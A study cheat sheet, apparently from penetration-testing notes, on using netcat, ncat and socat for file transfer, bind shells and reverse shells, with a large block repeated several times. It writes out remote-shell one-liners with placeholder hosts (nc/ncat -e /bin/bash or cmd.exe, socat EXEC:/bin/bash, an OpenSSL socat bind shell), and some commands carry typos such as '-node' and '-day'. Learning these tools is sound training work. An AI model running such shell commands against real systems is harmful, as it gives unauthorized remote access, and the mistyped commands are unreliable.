
The NATed user(LINUX) user in a Bind shell senario...
------------------------------------------------------
commands ===>
nc -nv <ip of the listner machine > <port being listened on>
short note about this command
-----------------------------
=>For communication between two devcies.
n=> disable dns name resolution.
v=> verbosity.

##############################################################
nc -nv <ip> <port> < <choose a file to be sent to the other host>.extension(.exe/.html/.py etc)
------------------------------------------------------
The Windows machine user
ncat -nvlp <port>
l=>listner
p=>port
----------------------------
ncat -nvlp <port> > <add a name to store the incoming file>.extension(.exe etc)
You can then read the content of the file later.
###############################################################

----------------bind_shell--------------------------------
ncat -nvlp <port> -e cmd.exe
-e switch=> execution
it execute what ever application it gets.
-------------------------------------
Or you can just do: ncat -nvlp <port> to communicate.

----------------Reverse Shell senario ----------------------------
Linux Machine
nc -nv <ip of Window pc> <port> -e /bin/bash

--------------------------------------------------
Windows Machine

ncat -nvlp <port>

The NATed user(LINUX) user in a Bind shell senario...
------------------------------------------------------
commands ===>
nc -nv <ip of the listner machine> <port being listened on>
short note about this command
-----------------------------
=>For communication between two devies.
n=> disable dns name resolution.
v=> verbosity.
-----------------------------
nc -nv <ip> <port> < <choose a file to be sent to the other host>.extension(.exe/.html/.py etc)
------------------------------------------------------
The Windows machine user
ncat -nvlp <port>
l=>listner
p=>port
----------------------------
ncat -nvlp <port> > <add a name to store the incoming file>.extension(.exe etc)
You can then read the content of the file later.

ncat -nvlp <port> -e cmd.exe
-e switch=> execution
it execute what ever application it gets.
-------------------------------------
Or you can just do: ncat -nvlp <port> to communicate.

----------------Reverse Shell senario ----------------------------
Linux Machine
nc -nv <ip of Window pc> <port> -e /bin/bash

--------------------------------------------------
Windows Machine

ncat -nvlp <port>

The NATed user(LINUX) user in a Bind shell senario...
------------------------------------------------------
commands ===>
nc -nv <ip of the listner machine> <port being listened on>
short note about this command
-----------------------------
=>For communication between two devies.
n=> disable dns name resolution.
v=> verbosity.
-----------------------------
nc -nv <ip> <port> < <choose a file to be sent to the other host>.extension(.exe/.html/.py etc)
------------------------------------------------------
The Windows machine user
ncat -nvlp <port>
l=>listner
p=>port
----------------------------
ncat -nvlp <port> > <add a name to store the incoming file>.extension(.exe etc)
You can then read the content of the file later.

ncat -nvlp <port> -e cmd.exe
-e switch=> execution
it execute what ever application it gets.
-------------------------------------
Or you can just do: ncat -nvlp <port> to communicate.

----------------Reverse Shell senario ----------------------------
Linux Machine
nc -nv <ip of Window pc> <port> -e /bin/bash

--------------------------------------------------
Windows Machine

ncat -nvlp <port>

The NATed user(LINUX) user in a Bind shell senario...
------------------------------------------------------
commands ===>
nc -nv <ip of the listner machine> <port being listened on>
short note about this command
-----------------------------
=>For communication between two devies.
n=> disable dns name resolution.
v=> verbosity.
-----------------------------
nc -nv <ip> <port> < <choose a file to be sent to the other host>.extension(.exe/.html/.py etc)
------------------------------------------------------
The Windows machine user
ncat -nvlp <port>
l=>listner
p=>port
----------------------------
ncat -nvlp <port> > <add a name to store the incoming file>.extension(.exe etc)
You can then read the content of the file later.

ncat -nvlp <port> -e cmd.exe
-e switch=> execution
it execute what ever application it gets.
-------------------------------------
Or you can just do: ncat -nvlp <port> to communicate.

----------------Reverse Shell senario ----------------------------
Linux Machine
nc -nv <ip of Window pc> <port> -e /bin/bash

--------------------------------------------------
Windows Machine

ncat -nvlp <port>

-----------------For File Transfer-------------------
(LINUX)
sudo socat TCP4-LISTEN:443,fork file:Netcat.txt
=>This sends a file Netcat.txt to the windows device listening on the other side.

(WINDOWS)
socat TCP4:<ip of the linux machine>:<port which is 443> file:<filename-to-recieve-the-downloaded-item.extension(txt,exe etc..)>,create

------------------------------Socat Reverse Shell---------------------------------------------------
(windows)
socat -d -d TCP4-LISTEN:<port which is 443/80 for tcp> STDOUT
-d =>Is for verbosity

(linux)
sudo socat TCP4:<ip of windows>:<port of 443> EXEC:/bin/bash
EXEC =>executes the bash shell

---------------------Socat Bind Shell--------------------------------
openssl req -newkey rsa:2048 -node --keyout bind_shell.key -x509 -day 3 -out bind_shell.crt
were:
req --> initiate a new certificate signing request.
-newkey --> generate a new private key.
ras:2048 --> use RSA encryption with a 2048 bit key length.
-nodes --> it stores the private key without passphrase protection.
-keyout--> saves the key to a file.
-x509 --> outputs a self-signed certificate instead of a certificate request.
-days -->set the validation period in days.
-out --> savs the certificate to a file.

(linux)
sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
verify=0 --> disable ssl verification
(windows)
socat -OPENSSL:<ip of linux machine>:443,verify=0




